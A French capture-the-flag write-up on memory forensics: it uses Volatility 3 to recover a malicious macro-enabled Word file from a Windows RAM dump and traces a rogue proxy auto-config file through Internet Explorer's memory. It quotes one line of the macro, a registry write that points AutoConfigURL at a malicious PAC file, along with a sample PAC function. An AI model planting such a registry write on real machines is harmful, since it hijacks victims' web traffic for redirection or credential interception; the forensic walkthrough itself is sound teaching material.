## Contexte


J’ai ouvert un fichier Word alléchant, mais je crois que j’ai eu tort.
Depuis, un site web important pour moi ne marche plus très bien.


On nous donne un fichier memory.dmp provenant d’une machine Windows compromise.
Ça semble flou, mais pour un analyste en sécurité, ce type de comportement déclenche automatiquement trois hypothèses principales :

### Hypothese
#### 1 le malware a modifié le proxy système

Beaucoup de malwares, en particulier ceux qui ciblent Windows, modifient les paramètres de proxy dans le registre

Pourquoi faire:

En redirigeant le navigateur vers un proxy malveillant, l’attaquant peut :

filtrer les sites visités/rediriger vers de faux sites/injecter des publicités/intercepter des identifiants

En bref :
Quand un seul site “ne marche plus”, souvent ça vient d’un proxy frauduleux.

#### 2 un fichier PAC malveillant (Proxy Auto-Config)

Pas tout l’Internet → un seul domaine.
Par exemple : bloquer / détourner uniquement bank.com, ou facebook.com.
Les autres sites marchent parfaitement.
C’est typique du comportement d’un PAC spécifiquement écrit pour mettre une règle sur un seul domaine.



### Analyse préliminaire — quels programmes étaient actifs ?

```kali@DESKTOP-N0M80R7:~/volatility3$ python3 vol.py -f ~/memory.dmp windows.pstree```

<img width="831" height="836" alt="image" src="https://github.com/user-attachments/assets/8d65dcdc-838a-4b99-a4f3-588a1d3fc199" />


On observe notamment :

WINWORD.EXE → Word ouvert avec le fichier Very_sexy.docm

iexplore.exe → Internet Explorer ouvert (pid 3388 et 3476)

Donc deux suspects :

Word (fichier malveillant)

Internet Explorer (affecté par une configuration modifiée)


### Extraire le fichier word depuis la ram

On cherche les occurrences du fichier .docm :

```
python3 vol.py -f memory.dmp windows.filescan | grep Very_sexy

```
<img width="788" height="43" alt="image" src="https://github.com/user-attachments/assets/b5508358-49cc-4cab-bbe6-f0b6de4c9f1f" />

Ce sont des adresses physiques du fichier dans la RAM.

On va donc les dump:

<img width="1901" height="57" alt="image" src="https://github.com/user-attachments/assets/6698c66d-3fa6-4b0f-b7fb-441480ff9dc6" />

On obtient un fichier  dont un fichier dat:
 `file.0xf3ee038.0x84cb24e8.DataSectionObject.Very_sexy.docm.dat
`
Ce .dat est tout simplement la copie brute (binaire) du fichier qui était chargé en RAM.

Les fichiers Word .docm sont chargés en mémoire quand Word les ouvre.

Volatility ne te les restitue pas avec leur nom original, mais sous une forme générique :

.dat → extension arbitraire (simple donnée binaire)

#### Donc pourquoi le charger:

Parce que c’est l’image réelle du document Word malveillant, telle qu’elle était chargée par WINWORD.EXE.
C’est le fichier que tu dois analyser.

On les renommes pour:

permettre à tes outils d’analyse de l’ouvrir (olevba, unzip, Word, etc.)

indiquer que c’est un fichier Word macro-enabled (.docm = Document + Macro)

`
mv dump/file.0xf3ee038.0x84cb24e8.DataSectionObject.Very_sexy.docm.dat Very_sexy.docm

`
### Analyse de la macro malveillante

On utilise olevba :

olevba fait partie des oletools, un ensemble d’outils spécialisés dans :

l’analyse de documents Office (Word, Excel, PowerPoint)

la détection de macros malveillantes

l’extraction de code VBA

<img width="1489" height="766" alt="image" src="https://github.com/user-attachments/assets/ba2df27e-9168-4f89-8bc1-a156a2f3710d" />

Que fait cette macro ?

Elle :

crée un objet WScript.Shell

modifie des clés du registre Windows

configure un auto-proxy via la clé AutoConfigURL

pointe vers un fichier PAC malveillant :
http://192.168.0.19:8080/BenNon.prox

Un PAC (Proxy Auto-Config) est un fichier Javascript qui dit :

Pour tel site web → utilise ce proxy / bloque l’accès => C’est donc ce fichier PAC qui contient le nom de domaine visé.


Ici, il révèle directement :

```
myWS.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\AutoConfigURL",
               "http://192.168.0.19:8080/BenNon.prox"

```

Donc grâce à olevba, on trouve l’URL du fichier PAC malveillant, ce qui est la clé du challenge.

### Retrouver le contenu du fichier PAC dans la RAM
Internet Explorer a forcément chargé le fichier BenNon.prox, donc il doit être en mémoire dans son processus.

Le PID d’IE trouvé plus tôt est :

3388

3476

On va dumper la mémoire du PID 3388 :

```
mkdir dump_ie
python3 vol.py -f memory.dmp -o dump_ie windows.memmap --pid 3388 --dump

```

Si IE l’a téléchargé, alors son contenu est dans la RAM du processus IE.

Donc on dump sa mémoire :

Ensuite on utilise `string` parce que un PAC c est un simple fichier texte contenant du JavaScript

avec des mots-clés reconnaissables qui doivent apparaître dans la RAM en clair

La structure d'un PAC c est généralement:

```

function FindProxyForURL(url, host) {
    if (shExpMatch(host, "*.site.com")) {
        return "PROXY 1.2.3.4:8080";
    }
    return "DIRECT";
}


```
Donc on fait

<img width="1186" height="336" alt="image" src="https://github.com/user-attachments/assets/3fee5452-7be6-4dc6-87db-c48977fba469" />




### Résumé

la macro pointe vers un fichier PAC => on dump la RAM d’Internet Explorer => on cherche le nom du PAC => on cherche la fonction PAC => le script révèle le site ciblé











